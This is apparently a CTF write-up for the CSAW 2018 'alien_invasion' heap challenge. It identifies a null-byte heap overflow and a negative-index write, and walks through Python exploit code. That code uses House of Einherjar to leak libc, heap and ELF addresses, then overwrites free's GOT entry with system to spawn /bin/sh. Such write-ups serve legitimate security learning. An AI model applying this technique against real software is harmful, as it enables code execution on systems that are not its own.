Quickly firing up IDA we can find below functionalities of  challenge binary.

**function** `dojo`
- Allocate `samurai`s and their weapon name of fixed 7 bytes length `sword`s (*option 1*)
- Free `samurai`s and `sword`s (*option 2*)
- Move on to `hatchery` function (*option 3*)

*Just after* `dojo` *function binary saves* `__malloc_hook` *and* `__free_hook` *values in global variable (discussed afterwards)*  

**function** `hatchery`  
- Allocate `alien`s and their `name`s of variable length specified by us. Here before `malloc`ing anything binary checks if `__malloc_hook` has been modified and will continue to proceed only if hook is not changed. (*option 1*)
- Free `alien`s and their `name`s. Here before `free`ing anything binary checks if `__free_hook` has been modified and will continue to proceed only if hook is not changed. (*option 2*)
- Change an `alien`s `name` with a new name of fixed 8 bytes length, this function also prints the previous `name` of the `alien` (*option 3*)
- Move on to `invasion` function (*option 4*)

**function** `invasion`  
- Frees allocated `samurai`s and `alien`s
- Decides who won, `samurai`s or `alien`s ? <-- not so relevant lol

### Bug Hunting
Now there are two bugs in this challenge binary and at least (lol) two ways to solve this challenge.  

**Single Null Byte Heap Overflow**  

If we see closely, while allocating `alien`s `name`, length of input taken and copied into `name`s memory is same as length `name` specified by users and then a null byte is append to `name`. Hence we get a null byte overflow. This is the bug I exploited during the CTF.  

![Null Byte Heap Overflow](../ctfs/csaw18/pwn/alien_invasion/null_byte.png)  

**Loose Checks on Index**  

While Renaming an `alien`, binary asks us the `index` of the `alien` for which we want to change name. There are no checks to handle negative values of index which in this case results in arbitrary write and results in a different exploitation approach which can be found in [writeup](https://github.com/0n3m4ns4rmy/ctf-write-ups/blob/master/csaw%20qualifiers%202018/alien_invasion/exploit.py) by 0n3m4ns4rmy.

### Exploitation

In this section I will be explaining my exploit code, so if you want to just look at that [here](https://github.com/twisted-fun/CTFs/blob/master/CSAW18/PWN_400/sploit.py) it is.  

Now I have made a [post](./2018-05-24-RCTF18-PWN-317.md) about how to exploit `Null byte heap overflow` before but what makes this challenge interesting is that challenge binary has got checks on `__malloc_hook` and `__free_hook`. So by normal way if we try to do a [fast-bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c) to overwrite `__malloc_hook`. We will not be able to execute `malloc` afterwards. But still exploitation is possible. As we see in `checksec` results that binary does not have Full RELRO (*RELocation Read-Only*) enabled, we can overwrite GOT entries to get code execution.  

**Leaking Libc**  

Our challenge binary has PIE (Position Independent Executables) enabled which will randomize process layout in memory. So in order to overwrite GOT entries we need to leak address of ELF. But we cannot do that directly. So we will start by leaking libc address.  

To find libc leak we will perform heap magic aka [House of Einherjar](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606). According to this, if we overflow a null byte in the next chunk (`smallbin`) which will cause its `prev_in_use` bit to be cleared and also we specify a fake `prev_size` larger than real heap chunk. Now when the next chunk is freed, it will find that `prev_in_use` bit is cleared and will try to merge with that creating a fake chunk. This fake chunk will be overlapping our original heap chunk.  
Now new allocations can be requested from created fake chunk. Here we allocate calculated bytes from fake chunk so that after allocation, part of free fake chunk remaining will be having same address as our real heap chunk. Now we have one free chunk and one allocated chunk both at same heap address so we can use allocated chunk to print (*leak*) address of forward pointer pointing to **main_arena**. From address of `main_arena` we can calculate address of libc base.  

Enough of theory rambling, Now I will try to explain my exploit to get libc leak.  

```python
# allocating 5 samurai
alloc_s()
alloc_s()
alloc_s()
alloc_s()
alloc_s()
# deleting 4 samurai
delete_s(0)
delete_s(1)
delete_s(2)
delete_s(3)
# moving on to hatchery
exit_s()
```

In our challenge, alien structure that we will be using for our exploitation is like `address_of_alien_name|hardcoded_value_256`  
and of fixed size 0x20 (*including heap metadata*). We need at least 0x100 byte of heap chunk to perform `House of Einherjar` so we need alien `name` chunks. But the problem is `alien` and `name` structs are will be alongside together in normal scenarios. In order to get rid of `alien` chunks I allocated 4 `samurai` chunks and freed them so those freed chunks will be used afterward to allocate `alien` chunks and we can focus on exploiting `name` chunks. If you see I have allocated 5 `samurai`s that is so because that will be helpful in getting a ELF leak afterwards. Bear with me for now.  

```python
alloc_a(0xf0,'A' * 0xf0)#sb1 #0
alloc_a(0x70,'B' * 0x70)#fb1 #1
alloc_a(0xf0,'C' * 0xf0)#sb2 #2
alloc_a(0x30,'D' * 0x30)#fb2 #3

delete_a(0)
delete_a(1)
# null byte heap overflow
# prev_size = 0x180
# prev_in_use = 0
alloc_a(0x78,'E' * 0x70 + p64(0x180)) #4

# first fastbin gets overlapped
delete_a(2)

alloc_a(0xf0,'F' * 0xf0) #5
#gdb.attach(r)

# libc leak
l = show_a(4)
rename_a(4, l)

libc_base = u64(l + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc_base))
```

First I allocated 4 chunks (*smallbins and fastbins*)  
**Note**- all the chunks below are alien `name`  
`sb1 (about to be merged with sb2) | fb1 (about to be overlapped) | sb2 (about to get overflowed into by fb1) | fb2`  
Delete first two, then allocate `fb1` again to overflow null byte into next `sb2` and put a fake `prev_size` of 0x180. Then we delete `sb2`, so it will see that previous chunk is free base on its `prev_in_use` being cleared. It will go back `prev_size` in memory to find previous chunk and will be merged with it. This will create a fake chunk of 0x280 bytes that will be overlapping our allocated `fb1`.  
Now we allocate a chunk of 0x100 from fake chunk so that new free chunk remaining will have the same address as our `fb1`. Here we can make use of rename functionality of binary to leak the address of `main_arena` and hence `libc_base`. If you see I renamed it again to same value that I leaked, just so to prevent any unintentional behavior.  

**Leaking Heap and ELF**

Yes I know we want to find ELF leak why am I trying to get heap address? There is a reason.  

Whats happening?  
- We want to leak ELF address
- Samurai `sword` names are stored on .bss
- Address of `sword` names are stored on heap in `samurai` structure
- An address of heap is in `alien` pointing to alien's `name`  

What to do?  
- Leak heap address of `name` by having an overlap of `name` (*of alien 1*) and `alien` (*alien 2*) struct and calling rename functionality on *alien 1*
- Calculate address of `samurai`s structure using heap leak
- Put the address of `samurai` in *alien 2* by calling rename on *alien 1*
- Now call rename on *alien 1* to leak address of `sword` which is our ELF leaked

```python
# get the 0x280 byte chunk
delete_a(5)

alloc_a(0x80, "G" * 0x80) #6
alloc_a(0x60, 'H' * 0x60) #7
alloc_a(0x40, 'I' * 0x40) #8

# leak heap
l = show_a(4)
heap_base = u64(l + "\x00" * 2) - 0x15f0
rename_a(4, p64(heap_base + 0x14b0))
log.info("heap_base: 0x{:x}".format(heap_base))
#gdb.attach(r)

# leak elf
l = show_a(8)
rename_a(8, l)
elf_base = u64(l + "\x00" * 2) - 0x202720
log.info("elf_base: 0x{:x}".format(elf_base))
```
  
Here I deleted 5th chunk so that we get our full size fake chunk again. Now we do some heap feng shui to get an overlap between our `fb1` (`name`) and an `alien`. To do this I allocated first 0x90 bytes then 0x70. So if we allocated anything now it will be overlapping `fb1`. If you remember I had arranged 4 0x20 bytes free heap chunks for `alien` structs so they dont interfere with my `name` exploitation. But as this new chunk that we will be allocating will be effectively 5th chunks (total_allocated_aliens-total_deleted_aliens == 4), It will be allocating `alien` also from our fake chunk and we will get an `alien` and `name` overlap. Hmm cool.  

After that I just leak the heap by calling rename on 4th `name` meaning `fb1`. Use that heap leak to calculate address of `samurai` and put that address in `alien` using rename in `name` `fb1`. Leak the ELF's .bss address by calling rename on `alien`.  

**GET RCE Already!**

```python
# getting got address on heap
l = show_a(4)
got_free = elf_base + 0x202018
rename_a(4, p64(got_free))

# overwriting got value
l = show_a(8)
rename_a(8, p64(libc_base + libc.symbols['system'])[:-1])
# passing parameter to system (free)
alloc_a(100, "/bin/sh")
delete_a(9)

r.interactive()
```

Now that we have ELF leak we calculate address of `free` GOT and use the same `name` & `alien` overlap to overwrite it with address of `system`. Then allocate a new `alien` with `name` as `/bin/sh`. So now when you free this `alien`s `name` you will be executing `system("/bin/sh")`.  
Enjoy your shell!  

Thanks to CSAW for creating such fun challenge :)
